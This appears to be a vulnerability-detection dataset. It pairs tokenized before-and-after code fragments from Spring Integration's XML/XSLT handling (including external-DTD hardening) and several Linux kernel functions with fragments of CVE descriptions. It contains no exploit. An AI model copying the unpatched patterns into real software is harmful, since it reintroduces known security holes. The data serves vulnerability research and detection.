"'", "ClassPathResource", "'", ",", "'", "FileSystemResource", "'", ",", "'", "ServletContextResource", "'", "or", "'", "VfsResource", "'", "\"", "\"", "are", "supported", "directly", "in", "this", "transformer", ".", "For", "any", "other", "'", "Resource", "'", "implementations", "\"", "\"", "consider", "to", "use", "a", "'", "Templates", "'", "-", "based", "constructor", "instantiation", ".", "\")", ";", "public", "void", "setXsltParamHeaders", "(", "String", ".", "..", "xsltParamHeaders", ")", "{", "Assert", ".", "notNull", "(", "xsltParamHeaders", ",", "\"", "'", "xsltParamHeaders", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "evaluationContext", "=", "ExpressionUtils", ".", "createStandardEvaluationContext", "(", "getBeanFactory", "(", "))", ";", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "transformerFactory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "transformerFactory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_STYLESHEET", ",", "\"", "file", ",", "jar", ":", "file", "\"", ");", "private", "Object", "transformSource", "(", "Source", "source", ",", "Object", "payload", ",", "Transformer", "transformer", ")", "throws", "TransformerException", "{", "if", "(", "!", "this", ".", "resultFactoryExplicitlySet", "&", "&", "\"", "text", "\"", ".", "equals", "(", "transformer", ".", "getOutputProperties", "(", ").", "getProperty", "(", "\"", "method", "\"", "))", ")", "{", "result", "=", "getResultFactory", "(", ").", "createResult", "(", "payload", ")", ";", "Result", "result", "=", "getResultFactory", "(", ").", "createResult", "(", "documentPayload", ")", ";", "*", "Copyright", "2014", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "private", "final", "XmlPayloadConverter", "converter", ";", "private", "XPathEvaluationType", "evaluationType", "=", "XPathEvaluationType", ".", "STRING_RESULT", ";", "private", "TypeDescriptor", "headerTypeDescriptor", ";", "private", "Boolean", "overwrite", ";", "this", "(", "expression", ",", "new", "DefaultXmlPayloadConverter", "(", "))", ";", "}", "/", "**", "*", "Construct", "an", "instance", "based", "on", "the", "provided", "xpath", "expression", "and", "{", "@", "link", "XmlPayloadConverter", "}", ".", "*", "@", "param", "expression", "the", "xpath", "expression", "to", "evaluate", ".", "*", "@", "param", "converter", "the", "{", "@", "link", "XmlPayloadConverter", "}", "to", "use", "for", "document", "conversion", ".", "*", "@", "since", "4", ".", "3", ".", "19", "*", "/", "public", "XPathExpressionEvaluatingHeaderValueMessageProcessor", "(", "String", "expression", ",", "XmlPayloadConverter", "converter", ")", "{", "this", "(", "XPathExpressionFactory", ".", "createXPathExpression", "(", "expression", ")", ",", "converter", ")", ";", "this", "(", "expression", ",", "new", "DefaultXmlPayloadConverter", "(", "))", ";", "}", "/", "**", "*", "Construct", "an", "instance", "based", "on", "the", "provided", "xpath", "expression", "and", "{", "@", "link", "XmlPayloadConverter", "}", ".", "*", "@", "param", "expression", "the", "xpath", "expression", "to", "evaluate", ".", "*", "@", "param", "converter", "the", "{", "@", "link", "XmlPayloadConverter", "}", "to", "use", "for", "document", "conversion", ".", "*", "@", "since", "4", ".", "3", ".", "19", "*", "/", "public", "XPathExpressionEvaluatingHeaderValueMessageProcessor", "(", "XPathExpression", "expression", ",", "XmlPayloadConverter", "converter", ")", "{", "Assert", ".", "notNull", "(", "expression", ",", "\"", "'", "expression", "'", "must", "not", "be", "null", ".", "\")", ";", "Assert", ".", "notNull", "(", "converter", ",", "\"", "'", "converter", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "converter", "=", "converter", ";", "Node", "node", "=", "this", ".", "converter", ".", "convertToNode", "(", "message", ".", "getPayload", "(", "))", ";", "*", "Copyright", "2013", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "*", "private", "static", "final", "List", "<", "String", ">", "RESULT_TYPES", "=", "Arrays", ".", "asList", "(", "STRING", ",", "BOOLEAN", ",", "NUMBER", ",", "NODE", ",", "NODE_LIST", ",", "DOCUMENT_LIST", ")", ";", "private", "static", "final", "XmlPayloadConverter", "converter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "private", "static", "final", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "static", "{", "documentBuilderFactory", ".", "setNamespaceAware", "(", "true", ")", ";", "}", "*", "@", "param", "object", "the", "xml", "Object", "for", "evaluation", ".", "*", "@", "param", "xpath", "an", "'", "xpath", "'", "expression", "String", ".", "*", "Only", "one", "argument", "is", "allowed", ",", "which", "can", "be", "an", "instance", "of", "*", "{", "@", "link", "org", ".", "springframework", ".", "xml", ".", "xpath", ".", "NodeMapper", "}", "or", "*", "one", "of", "these", "String", "constants", ":", "\"", "string", "\"", ",", "\"", "boolean", "\"", ",", "\"", "number", "\"", ",", "\"", "node", "\"", "or", "\"", "node_list", "\"", ".", "*", "@", "param", "<", "T", ">", "The", "required", "return", "type", ".", "*", "@", "throws", "org", ".", "springframework", ".", "messaging", ".", "MessagingException", "-", "if", "the", "provided", "*", "object", "can", "'", "t", "be", "converted", "to", "a", "{", "@", "link", "Node", "}", ";", "@", "SuppressWarnings", "(", "{", "\"", "unchecked", "\"", "}", ")", "public", "static", "<", "T", ">", "T", "evaluate", "(", "Object", "object", ",", "String", "xpath", ",", "Object", ".", "..", "resultArg", ")", "{", "Node", "node", "=", "converter", ".", "convertToNode", "(", "object", ")", ";", "List", "<", "Node", ">", "nodeList", "=", "(", "List", "<", "Node", ">", ")", "XPathEvaluationType", ".", "NODE_LIST_RESULT", ".", "evaluateXPath", "(", "expression", ",", "node", ")", ";", "List", "<", "Node", ">", "documents", "=", "new", "ArrayList", "<", ">(", "nodeList", ".", "size", "(", "))", ";", "<", "xsd", ":", "attribute", "name", "=", "\"", "converter", "\"", ">", "<", "xsd", ":", "annotation", ">", "<", "xsd", ":", "documentation", ">", "Specify", "the", "XmlPayloadConverter", "to", "use", "when", "converting", "a", "Message", "payload", "prior", "to", "XPath", "evaluation", ".", "The", "DefaultXmlPayloadConverter", "is", "used", "if", "this", "reference", "is", "not", "provided", ",", "and", "it", "should", "be", "sufficient", "in", "most", "cases", "since", "it", "can", "convert", "from", "Node", ",", "Document", ",", "Source", ",", "File", ",", "and", "String", "typed", "payloads", ".", "<", "/", "xsd", ":", "documentation", ">", "<", "xsd", ":", "appinfo", ">", "<", "tool", ":", "annotation", "kind", "=", "\"", "ref", "\"", ">", "<", "tool", ":", "expected", "-", "type", "type", "=", "\"", "org", ".", "springframework", ".", "integration", ".", "xml", ".", "XmlPayloadConverter", "\"", "/>", "<", "/", "tool", ":", "annotation", ">", "<", "/", "xsd", ":", "appinfo", ">", "<", "/", "xsd", ":", "annotation", ">", "<", "/", "xsd", ":", "attribute", ">", "<", "xpath", "-", "header", "-", "enricher", "id", "=", "\"", "customHeaderEnricher", "\"", "input", "-", "channel", "=", "\"", "customInput", "\"", "default", "-", "overwrite", "=", "\"", "true", "\"", "should", "-", "skip", "-", "nulls", "=", "\"", "false", "\"", "converter", "=", "\"", "xmlPayloadConverter", "\"", ">", "<", "beans", ":", "bean", "id", "=", "\"", "xmlPayloadConverter", "\"", "class", "=", "\"", "org", ".", "springframework", ".", "integration", ".", "xml", ".", "DefaultXmlPayloadConverter", "\"", "/>", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "instanceOf", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertSame", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "org", ".", "springframework", ".", "integration", ".", "transformer", ".", "support", ".", "HeaderValueMessageProcessor", ";", "import", "org", ".", "springframework", ".", "integration", ".", "xml", ".", "transformer", ".", "support", ".", "XPathExpressionEvaluatingHeaderValueMessageProcessor", ";", "import", "org", ".", "springframework", ".", "test", ".", "context", ".", "junit4", ".", "SpringRunner", ";", "@", "RunWith", "(", "SpringRunner", ".", "class", ")", "private", "final", "Message", "<", "?>", "message", "=", "MessageBuilder", ".", "withPayload", "(", "\"<", "person", "name", "=", "'", "John", "Doe", "'", "age", "=", "'", "42", "'", "married", "=", "'", "true", "'", "/>", "\")", ".", "build", "(", ");", "public", "void", "testParse", "(", ")", "{", "assertThat", "(", "header", ",", "instanceOf", "(", "List", ".", "class", ")", ");", "assertNotNull", "(", "nodeList", ")", ";", "Message", "<", "?>", "result", "=", "getResultMessage", "(", ");", "assertEquals", "(", "84d", ",", "result", ".", "getHeaders", "(", ").", "get", "(", "\"", "ref", "-", "test", "\"", "))", ";", "public", "void", "testDefaultHeaderEnricher", "(", ")", "{", "assertFalse", "(", "getEnricherProperty", "(", "\"", "defaultHeaderEnricher", "\"", ",", "\"", "defaultOverwrite", "\"", "))", ";", "assertTrue", "(", "getEnricherProperty", "(", "\"", "defaultHeaderEnricher", "\"", ",", "\"", "shouldSkipNulls", "\"", "))", ";", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "public", "void", "testCustomHeaderEnricher", "(", ")", "{", "assertTrue", "(", "getEnricherProperty", "(", "\"", "customHeaderEnricher", "\"", ",", "\"", "defaultOverwrite", "\"", "))", ";", "assertFalse", "(", "getEnricherProperty", "(", "\"", "customHeaderEnricher", "\"", ",", "\"", "shouldSkipNulls", "\"", "))", ";", "Map", "<", "String", ",", "?", "extends", "HeaderValueMessageProcessor", "<", "?>", ">", "headersToAdd", "=", "TestUtils", ".", "getPropertyValue", "(", "this", ".", "context", ".", "getBean", "(", "\"", "customHeaderEnricher", "\"", "),", "\"", "handler", ".", "transformer", ".", "headersToAdd", "\"", ",", "Map", ".", "class", ")", ";", "HeaderValueMessageProcessor", "<", "?>", "headerValueMessageProcessor", "=", "headersToAdd", ".", "get", "(", "\"", "foo", "\"", ");", "assertThat", "(", "headerValueMessageProcessor", ",", "instanceOf", "(", "XPathExpressionEvaluatingHeaderValueMessageProcessor", ".", "class", ")", ");", "assertSame", "(", "this", ".", "context", ".", "getBean", "(", "\"", "xmlPayloadConverter", "\"", "),", "TestUtils", ".", "getPropertyValue", "(", "headerValueMessageProcessor", ",", "\"", "converter", "\"", "))", ";", "assertNotNull", "(", "reply", ")", ";", "assertNotNull", "(", "reply", ")", ";", "return", "(", "boolean", ")", "new", "DirectFieldAccessor", "(", "enricher", ")", ".", "getPropertyValue", "(", "propertyName", ")", ";", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "javax", ".", "xml", ".", "transform", ".", "Templates", ";", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "rules", ".", "TemporaryFolder", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "FileSystemResource", ";", "import", "org", ".", "springframework", ".", "util", ".", "FileCopyUtils", ";", "@", "Rule", "public", "TemporaryFolder", "temporaryFolder", "=", "new", "TemporaryFolder", "(", ");", "public", "void", "setUp", "(", ")", "throws", "Exception", "{", "this", ".", "transformer", "=", "new", "XsltPayloadTransformer", "(", "getXslTemplates", "(", "))", ";", "XsltPayloadTransformer", "transformer", "=", "new", "XsltPayloadTransformer", "(", "getXslTemplates", "(", "),", "new", "StubResultTransformer", "(", "returnValue", ")", ");", "public", "void", "testXsltPayloadWithTransformerFactoryClassName", "(", ")", "throws", "Exception", "{", "new", "XsltPayloadTransformer", "(", "getXslResourceThatOutputsText", "(", "),", "new", "StubResultTransformer", "(", "returnValue", ")", ",", "public", "void", "testXsltPayloadWithBadTransformerFactoryClassName", "(", ")", "throws", "IOException", "{", "XsltPayloadTransformer", "transformer", "=", "new", "XsltPayloadTransformer", "(", "getXslResourceThatOutputsText", "(", "),", "\"", "foo", ".", "bar", ".", "Baz", "\"", ");", "private", "Templates", "getXslTemplates", "(", ")", "throws", "Exception", "{", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "return", "transformerFactory", ".", "newTemplates", "(", "new", "StringSource", "(", "xsl", ")", ");", "private", "Resource", "getXslResourceThatOutputsText", "(", ")", "throws", "IOException", "{", "File", "xsltFile", "=", "this", ".", "temporaryFolder", ".", "newFile", "(", ");", "FileCopyUtils", ".", "copy", "(", "xsl", ".", "getBytes", "(", "),", "xsltFile", ")", ";", "return", "new", "FileSystemResource", "(", "xsltFile", ")", ";</s>springWsVersion", "=", "'", "3", ".", "0", ".", "4", ".", "RELEASE", "'", "*", "Copyright", "2002", "-", "2017", "the", "original", "author", "or", "authors", ".", "this", ".", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "Node", "node", "=", "null", ";", "Source", "source", "=", "null", ";", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "ManagedMap", "<", "String", ",", "Object", ">", "headers", "=", "new", "ManagedMap", "<", "String", ",", "Object", ">", "()", ";", "this", ".", "processHeaders", "(", "element", ",", "headers", ",", "parserContext", ")", ";", "BeanDefinitionBuilder", ".", "genericBeanDefinition", "(", "XPathExpressionEvaluatingHeaderValueMessageProcessor", ".", "class", ")", ";", "if", "(", "!(", "isExpressionString", "^", "isExpressionRef", ")", ")", "{", "\"", "Exactly", "one", "of", "the", "'", "xpath", "-", "expression", "'", "or", "'", "xpath", "-", "expression", "-", "ref", "'", "attributes", "is", "required", ".", "\",", "source", ")", ";", "*", "Copyright", "2002", "-", "2010", "the", "original", "author", "or", "authors", ".", "public", "DomResultFactory", "(", "DocumentBuilderFactory", "documentBuilderFactory", ")", "{", "this", ".", "documentBuilderFactory", "=", "documentBuilderFactory", ";", "public", "DomResultFactory", "(", ")", "{", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "factory", ".", "setNamespaceAware", "(", "true", ")", ";", "this", ".", "documentBuilderFactory", "=", "factory", ";", "private", "final", "Log", "logger", "=", "LogFactory", ".", "getLog", "(", "this", ".", "getClass", "(", "))", ";", "private", "volatile", "boolean", "throwExceptionOnRejection", ";", "private", "volatile", "XmlPayloadConverter", "converter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "public", "XmlValidatingMessageSelector", "(", "XmlValidator", "xmlValidator", ")", "{", "Assert", ".", "notNull", "(", "xmlValidator", ",", "\"", "XmlValidator", "must", "not", "be", "null", "\"", ");", "this", ".", "xmlValidator", "=", "xmlValidator", ";", "}", "*", "*", "@", "param", "schemaTypeArg", "The", "schema", "type", ".", "*", "public", "XmlValidatingMessageSelector", "(", "Resource", "schema", ",", "SchemaType", "schemaTypeArg", ")", "throws", "IOException", "{", "SchemaType", "schemaType", "=", "schemaTypeArg", ";", "Assert", ".", "notNull", "(", "schema", ",", "\"", "You", "must", "provide", "XML", "schema", "location", "to", "perform", "validation", "\"", ");", "if", "(", "schemaType", "=", "=", "null", ")", "{", "schemaType", "=", "SchemaType", ".", "XML_SCHEMA", ";", "}", "this", ".", "xmlValidator", "=", "XmlValidatorFactory", ".", "createValidator", "(", "schema", ",", "schemaType", ".", "getUrl", "(", "))", ";", "this", "(", "schema", ",", "StringUtils", ".", "isEmpty", "(", "schemaType", ")", "?", "null", ":", "SchemaType", ".", "valueOf", "(", "schemaType", ".", "toUpperCase", "(", ").", "replaceFirst", "(", "\"-", "\",", "\"", "_", "\"", "))", ");", "new", "AggregatedXmlMessageValidationException", "(", "Arrays", ".", "<", "Throwable", ">", "asList", "(", "validationExceptions", ")", "))", ";", "this", ".", "logger", ".", "debug", "(", "\"", "Message", "was", "rejected", "due", "to", "XML", "Validation", "errors", "\"", ");", "*", "Copyright", "2002", "-", "2016", "the", "original", "author", "or", "authors", ".", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "factory", ".", "setNamespaceAware", "(", "true", ")", ";", "this", ".", "documentBuilderFactory", "=", "factory", ";", "Document", "document", "=", "this", ".", "getNewDocumentBuilder", "(", ").", "parse", "(", "file", ")", ";", "*", "Copyright", "2002", "-", "2016", "the", "original", "author", "or", "authors", ".", "this", "(", "TransformerFactory", ".", "newInstance", "(", "))", ";", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "private", "final", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "private", "volatile", "boolean", "createDocuments", ";", "private", "volatile", "DocumentBuilderFactory", "documentBuilderFactory", ";", "private", "volatile", "XmlPayloadConverter", "xmlPayloadConverter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "private", "volatile", "Properties", "outputProperties", ";", "private", "volatile", "boolean", "iterator", "=", "true", ";", "this", "(", "expression", ",", "new", "HashMap", "<", "String", ",", "String", ">", "()", ");", "this", "(", "XPathExpressionFactory", ".", "createXPathExpression", "(", "expression", ",", "namespaces", ")", ");", "this", ".", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "List", "<", "String", ">", "splitStrings", "=", "new", "ArrayList", "<", "String", ">", "(", "items", ".", "size", "(", "))", ";", "*", "Copyright", "2002", "-", "2010", "the", "original", "author", "or", "authors", ".", "public", "ResultToDocumentTransformer", "(", "DocumentBuilderFactory", "documentBuilderFactory", ")", "{", "this", ".", "documentBuilderFactory", "=", "documentBuilderFactory", ";", "}", "this", ".", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "Document", "document", "=", "null", ";", "*", "Copyright", "2002", "-", "2010", "the", "original", "author", "or", "authors", ".", "private", "volatile", "Properties", "outputProperties", ";", "this", ".", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "returnString", "=", "(", "(", "StringResult", ")", "result", ")", ".", "toString", "(", ");", "this", ".", "getNewTransformer", "(", ").", "transform", "(", "Transformer", "transformer", "=", "null", ";", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "private", "volatile", "Resource", "xslResource", ";", "private", "volatile", "Templates", "templates", ";", "private", "volatile", "SourceFactory", "sourceFactory", "=", "new", "DomSourceFactory", "(", ");", "private", "volatile", "boolean", "resultFactoryExplicitlySet", ";", "private", "volatile", "boolean", "alwaysUseSourceFactory", "=", "false", ";", "private", "volatile", "boolean", "alwaysUseResultFactory", "=", "false", ";", "private", "volatile", "String", "[", "]", "xsltParamHeaders", ";", "Assert", ".", "notNull", "(", "xslResource", ",", "\"", "'", "xslResource", "'", "must", "not", "be", "null", ".", "\")", ";", "Assert", ".", "hasText", "(", "transformerFactoryClassName", ",", "\"", "'", "transformerFactoryClassName", "'", "must", "not", "be", "empty", "String", ".", "\")", ";", "this", ".", "xslResource", "=", "xslResource", ";", "this", ".", "transformerFactoryClassName", "=", "transformerFactoryClassName", ";", "this", ".", "resultTransformer", "=", "null", ";", "public", "XsltPayloadTransformer", "(", "Resource", "xslResource", ",", "ResultTransformer", "resultTransformer", ",", "String", "transformerFactoryClassName", ")", "{", "public", "XsltPayloadTransformer", "(", "Templates", "templates", ",", "ResultTransformer", "resultTransformer", ")", "{", "Assert", ".", "notNull", "(", "templates", ",", "\"", "'", "templates", "'", "must", "not", "be", "null", ".", "\")", ";", "this", ".", "templates", "=", "templates", ";", "this", ".", "resultTransformer", "=", "resultTransformer", ";", "}", "*", "*", "*", "*", "public", "void", "setXsltParamHeaders", "(", "String", "[", "]", "xsltParamHeaders", ")", "{", "this", ".", "evaluationContext", "=", "ExpressionUtils", ".", "createStandardEvaluationContext", "(", "this", ".", "getBeanFactory", "(", "))", ";", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "private", "Object", "transformSource", "(", "Source", "source", ",", "Object", "payload", ",", "Transformer", "transformer", ")", "throws", "TransformerException", "{", "if", "(", "!", "this", ".", "resultFactoryExplicitlySet", "&", "&", "\"", "text", "\"", ".", "equals", "(", "transformer", ".", "getOutputProperties", "(", ").", "getProperty", "(", "\"", "method", "\"", "))", ")", "{", "result", "=", "this", ".", "getResultFactory", "(", ").", "createResult", "(", "payload", ")", ";", "Result", "result", "=", "this", ".", "getResultFactory", "(", ").", "createResult", "(", "documentPayload", ")", ";", "*", "Copyright", "2014", "the", "original", "author", "or", "authors", ".", "private", "static", "final", "XmlPayloadConverter", "converter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "private", "volatile", "XPathEvaluationType", "evaluationType", "=", "XPathEvaluationType", ".", "STRING_RESULT", ";", "private", "volatile", "TypeDescriptor", "headerTypeDescriptor", ";", "private", "volatile", "Boolean", "overwrite", "=", "null", ";", "Assert", ".", "hasText", "(", "expression", ",", "\"", "expression", "must", "have", "text", "\"", ");", "this", ".", "expression", "=", "XPathExpressionFactory", ".", "createXPathExpression", "(", "expression", ")", ";", "Assert", ".", "notNull", "(", "expression", ",", "\"", "expression", "must", "not", "be", "null", "\"", ");", "Node", "node", "=", "converter", ".", "convertToNode", "(", "message", ".", "getPayload", "(", "))", ";", "*", "Copyright", "2013", "-", "2018", "the", "original", "author", "or", "authors", ".", "private", "static", "List", "<", "String", ">", "RESULT_TYPES", "=", "Arrays", ".", "asList", "(", "STRING", ",", "BOOLEAN", ",", "NUMBER", ",", "NODE", ",", "NODE_LIST", ",", "DOCUMENT_LIST", ")", ";", "private", "static", "XmlPayloadConverter", "converter", "=", "new", "DefaultXmlPayloadConverter", "(", ");", "private", "static", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "*", "*", "*", "@", "param", "o", "the", "xml", "Object", "for", "evaluaton", ".", "*", "@", "param", "xpath", "an", "'", "xpath", "'", "expression", "String", ".", "*", "Only", "one", "argument", "is", "allowed", ",", "which", "can", "be", "an", "instance", "of", "{", "@", "link", "org", ".", "springframework", ".", "xml", ".", "xpath", ".", "NodeMapper", "}", "or", "*", "one", "of", "these", "String", "constants", ":", "\"", "string", "\"", ",", "\"", "boolean", "\"", ",", "\"", "number", "\"", ",", "\"", "node", "\"", "or", "\"", "node_list", "\"", ".", "*", "@", "param", "<", "T", ">", "The", "required", "return", "type", ".", "*", "@", "throws", "org", ".", "springframework", ".", "messaging", ".", "MessagingException", "-", "if", "the", "provided", "object", "can", "'", "t", "be", "converted", "to", "a", "{", "@", "link", "Node", "}", ";", "@", "SuppressWarnings", "(", "{\"", "unchecked", "\"", "})", "public", "static", "<", "T", ">", "T", "evaluate", "(", "Object", "o", ",", "String", "xpath", ",", "Object", ".", "..", "resultArg", ")", "{", "Node", "node", "=", "converter", ".", "convertToNode", "(", "o", ")", ";", "List", "<", "Node", ">", "nodeList", "=", "(", "List", "<", "Node", ">", ")", "XPathEvaluationType", ".", "NODE_LIST_RESULT", ".", "evaluateXPath", "(", "expression", ",", "node", ")", ";", "List", "<", "Node", ">", "documents", "=", "new", "ArrayList", "<", "Node", ">", "(", "nodeList", ".", "size", "(", "))", ";", "<", "xpath", "-", "header", "-", "enricher", "id", "=", "\"", "customHeaderEnricher", "\"", "input", "-", "channel", "=", "\"", "customInput", "\"", "default", "-", "overwrite", "=", "\"", "true", "\"", "should", "-", "skip", "-", "nulls", "=", "\"", "false", "\"", ">", "*", "Copyright", "2002", "-", "2016", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "test", ".", "context", ".", "ContextConfiguration", ";", "import", "org", ".", "springframework", ".", "test", ".", "context", ".", "junit4", ".", "SpringJUnit4ClassRunner", ";", "@", "ContextConfiguration", "@", "RunWith", "(", "SpringJUnit4ClassRunner", ".", "class", ")", "private", "final", "Message", "<", "?>", "message", "=", "MessageBuilder", ".", "withPayload", "(", "\"<", "person", "name", "=", "'", "John", "Doe", "'", "age", "=", "'", "42", "'", "married", "=", "'", "true", "'", "/>", "\")", ".", "build", "(", ");", "public", "void", "testParse", "(", ")", "throws", "Exception", "{", "assertTrue", "(", "List", ".", "class", ".", "isAssignableFrom", "(", "header", ".", "getClass", "(", "))", ");", "Message", "<", "?>", "result", "=", "this", ".", "getResultMessage", "(", ");", "assertEquals", "(", "new", "Double", "(", "84", ")", ",", "result", ".", "getHeaders", "(", ").", "get", "(", "\"", "ref", "-", "test", "\"", "))", ";", "}", "@", "Test", "public", "void", "defaultOverwrite", "(", ")", "{", "assertEquals", "(", "false", ",", "this", ".", "getEnricherProperty", "(", "\"", "defaultHeaderEnricher", "\"", ",", "\"", "defaultOverwrite", "\"", "))", ";", "public", "void", "defaultShouldSkipNulls", "(", ")", "{", "assertEquals", "(", "true", ",", "this", ".", "getEnricherProperty", "(", "\"", "defaultHeaderEnricher", "\"", ",", "\"", "shouldSkipNulls", "\"", "))", ";", "public", "void", "customOverwrite", "(", ")", "{", "assertEquals", "(", "true", ",", "this", ".", "getEnricherProperty", "(", "\"", "customHeaderEnricher", "\"", ",", "\"", "defaultOverwrite", "\"", "))", ";", "}", "@", "Test", "public", "void", "customShouldSkipNulls", "(", ")", "{", "assertEquals", "(", "false", ",", "this", ".", "getEnricherProperty", "(", "\"", "customHeaderEnricher", "\"", ",", "\"", "shouldSkipNulls", "\"", "))", ";", "return", "(", "(", "Boolean", ")", "new", "DirectFieldAccessor", "(", "enricher", ")", ".", "getPropertyValue", "(", "propertyName", ")", ").", "booleanValue", "(", ");", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ByteArrayResource", ";", "public", "void", "setUp", "(", ")", "{", "this", ".", "transformer", "=", "new", "XsltPayloadTransformer", "(", "getXslResource", "(", "))", ";", "XsltPayloadTransformer", "transformer", "=", "new", "XsltPayloadTransformer", "(", "getXslResource", "(", "),", "new", "StubResultTransformer", "(", "returnValue", ")", ");", "public", "void", "testXsltPayloadWithTransformerFactoryClassname", "(", ")", "throws", "Exception", "{", "new", "XsltPayloadTransformer", "(", "getXslResource", "(", "),", "new", "StubResultTransformer", "(", "returnValue", ")", ",", "public", "void", "testXsltPayloadWithBadTransformerFactoryClassname", "(", ")", "{", "XsltPayloadTransformer", "transformer", "=", "new", "XsltPayloadTransformer", "(", "getXslResource", "(", "),", "\"", "foo", ".", "bar", ".", "Baz", "\"", ");", "private", "Resource", "getXslResource", "(", ")", "{", "return", "new", "ByteArrayResource", "(", "xsl", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "private", "Resource", "getXslResourceThatOutputsText", "(", ")", "{", "return", "new", "ByteArrayResource", "(", "xsl", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "fp", "&", "&", "NFCT_FRAG6_CB", "(", "fp", ")", "->", "orig", "=", "=", "NULL", ")</s>if", "(", "NFCT_FRAG6_CB", "(", "fp", ")", "->", "orig", "=", "=", "NULL", ")", "if", "(", "!(", "fhdr", "-", ">", "frag_off", "&", "htons", "(", "0xFFF9", ")", "))", "{", "pr_debug", "(", "\"", "Invalid", "fragment", "offset", "\\", "n", "\"", ");", "/", "*", "It", "is", "not", "a", "fragmented", "frame", "*", "/", "goto", "ret_orig", ";", "}"], "docstring_tokens": ["sending", "a", "specially-crafted", "packet"]}
{"contents": ["empty"], "code_tokens": ["goto", "out_put_key", ";</s>goto", "out", ";"], "docstring_tokens": ["via", "vectors", "involving", "an", "unmount", "of", "an", "ext3", "filesystem", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "upg", "&", "&", "!", "IS_ERR", "(", "upg", ")", "/", "*", "&", "&", "pg", "!", "=", "upg", "*", "/)", "{", "goto", "no_page", ";", "goto", "bad_page", ";", "bad_page", ":", "pte_unmap_unlock", "(", "ptep", ",", "ptl", ")", ";", "return", "ERR_PTR", "(", "-", "EFAULT", ")", ";", "no_page", ":", "pte_unmap_unlock", "(", "ptep", ",", "ptl", ")", ";", "if", "(", "!", "pte_none", "(", "pte", ")", ")", "return", "page", ";", "/", "*", "Fall", "through", "to", "ZERO_PAGE", "handling", "*", "/", "if", "(", "IS_ERR", "(", "page", ")", ")", "return", "i", "?", "i", ":", "PTR_ERR", "(", "page", ")", ";", "err", "=", "PTR_ERR", "(", "page", ")", ";", "if", "(", "IS_ERR", "(", "page", ")", ")", "goto", "set_status", ";", "err", "=", "PTR_ERR", "(", "page", ")", ";", "if", "(", "IS_ERR", "(", "page", ")", ")", "goto", "set_status", ";</s>if", "(", "upg", "/", "*", "&", "&", "pg", "!", "=", "upg", "*", "/)", "{", "if", "(", "!", "ptep", ")", "goto", "out", ";", "goto", "unlock", ";", "goto", "unlock", ";"], "docstring_tokens": ["via", "a", "large", "number", "of", "calls", "to", "the", "get_user_pages", "function"]}
